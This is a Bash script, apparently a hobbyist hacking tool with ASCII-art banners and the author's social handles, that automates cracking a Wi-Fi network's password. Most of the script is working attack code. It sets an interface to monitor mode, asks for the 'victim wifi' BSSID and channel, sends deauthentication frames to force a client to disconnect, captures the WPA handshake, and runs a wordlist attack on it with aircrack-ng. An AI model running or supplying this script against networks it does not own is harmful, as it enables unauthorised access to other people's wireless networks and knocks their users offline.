#!/bin/bash
red="\033[1;31m"
reset="\e[0m"
clear
ifc(){
echo ""
read -p "$(echo -ne "what is your ${red}interface${reset} :  ")"  int
if [[ $int  == ""  ]]; then 
	echo -ne "\n"
	echo -ne "${red}you have to tybe your interface [!] ${reset}"
	echo -ne "\n"
	sleep 1
	ifc
fi
}
bannerex(){
echo '''
▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▄██████▒▒▒▒▒▄▄▄█▄▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▄██▀░░▀██▄▒▒▒▒████████▄▒▒▒▒▒▒
▒▒▒▒▒▒███░░░░░░██▒▒▒▒▒▒█▀▀▀▀▀██▄▄▒▒▒
▒▒▒▒▒▄██▌░░░░░░░██▒▒▒▒▐▌▒▒▒▒▒▒▒▒▀█▄▒
▒▒▒▒▒███░░▐█░█▌░██▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▀▌
▒▒▒▒████░▐█▌░▐█▌██▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▐████░▐░░░░░▌██▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒████░░░▄█░░░██▒▒▐█▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒████░░░██░░██▌▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒████▌░▐█░░███▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▐████░░▌░███▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒████░░░███▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒██████▌░████▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▐████████████▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒█████████████▄████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
█████████████████▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
█████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
'''
echo -ne "\n"
echo -ne "c o d e d by${red} A Z O${reset} | snapchat : ${red}uur_2v${reset} | insta : ${red}r7jhz1${reset} | github : ${red}Az0122${reset}
"
}
banner(){
echo '''


▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▄██████▒▒▒▒▒▄▄▄█▄▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▄██▀░░▀██▄▒▒▒▒████████▄▒▒▒▒▒▒
▒▒▒▒▒▒███░░░░░░██▒▒▒▒▒▒█▀▀▀▀▀██▄▄▒▒▒
▒▒▒▒▒▄██▌░░░░░░░██▒▒▒▒▐▌▒▒▒▒▒▒▒▒▀█▄▒
▒▒▒▒▒███░░▐█░█▌░██▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▀▌
▒▒▒▒████░▐█▌░▐█▌██▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▐████░▐░░░░░▌██▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒████░░░▄█░░░██▒▒▐█▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒████░░░██░░██▌▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒████▌░▐█░░███▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▐████░░▌░███▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒████░░░███▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒██████▌░████▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▐████████████▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒█████████████▄████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
█████████████████▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
█████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
'''
echo -ne "\n"
echo -ne "c o d e d by${red} A Z O${reset} | snapchat : ${red}uur_2v${reset} | insta : ${red}r7jhz1${reset} | github : ${red}Az0122${reset}
"
echo ' ' 
echo 'hello ( : '
sleep 0.8
}
root(){
roo=$(id -u)
if [ $roo != 0 ] ; then 
echo " " 
	echo -ne "${red}permission denied Run it as root [!] ${reset}"
sleep 0.8
	exit 1 
fi
}
wifihack(){
FILE=/usr/sbin/airodump-ng
FILE1=/usr/sbin/aireplay-ng
FILE2=/usr/sbin/airmon-ng
FILE3=/usr/bin/aircrack-ng
if [[ -f "$FILE" || -f "$FILE1" || -f "$FILE2" || -f "$FILE3" ]]; then
    echo ""
else
        echo "you dont have the tools ):"
        sleep 0.6
        echo "installing now . . . "
        sleep 1 
        sudo apt-get install airodump-ng && sudo apt-get install airmon-ng && sudo apt-get install aireplay-ng && sudo apt-get install aircrack-ng 
fi
ifc
sleep 0.4
sudo airmon-ng start $int > /dev/null 
ctrl-c(){
echo -ne "\n"
echo 'bye . . . '
sudo airmon-ng stop ${int}mon >/dev/null
exit
}
trap ctrl-c 2 && trap ctrl-c TSTP
sudo timeout 10.5 airodump-ng ${int}mon
echo -ne "${reset}"
echo -ne "\n"
bssid(){
echo -ne "\n"
read -p "$(echo -ne "Enter the ${red}BSSID${reset} and ${red}CH${reset} of the victim wifi : ")" bss ch
if [[ $bss == "" || $ch == "" ]]; then
echo -ne "\n"
echo -ne "${red}you have to tybe The BSSID AND THE CHANNEL  [!] ${reset}"
echo -ne "\n"
sleep 1

bssid
fi
}
bssid
iwconfig ${int}mon channel $ch > /dev/null
echo -ne "\n"
handch(){
echo -ne "\n"
read -p "$(echo -ne "Enter the name of the ${red}handcheck${reset} ! : ")" hand 
if [[ $hand == "" ]] ; then 
echo -ne "\n"
	echo -ne "${red}you have to tybe the handcheck name  [!] ${reset}"
	echo -ne "\n"
	sleep 1

handch
fi
}
handch
sudo timeout 15 airodump-ng --bssid $bss -c $ch ${int}mon 
echo -ne "\n"
maccli(){
echo -ne "\n"
read -p "$(echo -ne "Enter The ${red}MAC Address${reset} of The ${red}client${reset} :  ")" cli
if [[ $cli == "" ]] ; then 
echo -ne "\n"
echo -ne "${red}you have to type the Mac Address of the Client  [!] ${reset}"
echo -ne "\n"
sleep 1
maccli
fi
}
maccli
sudo aireplay-ng -0 5 -a $bss -c $cli -D ${int}mon 
sudo timeout 18 airodump-ng --bssid $bss -c $ch -w $hand ${int}mon 
echo -ne "\n"
wordd(){
echo -ne "\n"
read -p "$(echo -ne "Enter the ${red}Wordlist password${reset} ${red} without (.txt) ${reset}: ")" pass
if [[ $pass == "" ]]; then 
echo -ne "\n"
	echo -ne "${red}you have to tybe the passlist  [!] ${reset}"
	echo -ne "\n"
	sleep 1
wordd


fi
}
wordd
sudo aircrack-ng $hand-01.cap -w ${pass}.txt
sudo airmon-ng stop ${int}mon
echo -ne """${red}

Thx for Using my Script ! 

${reset}"""
sleep 1.3 
bannerex
}
banner
root
wifihack
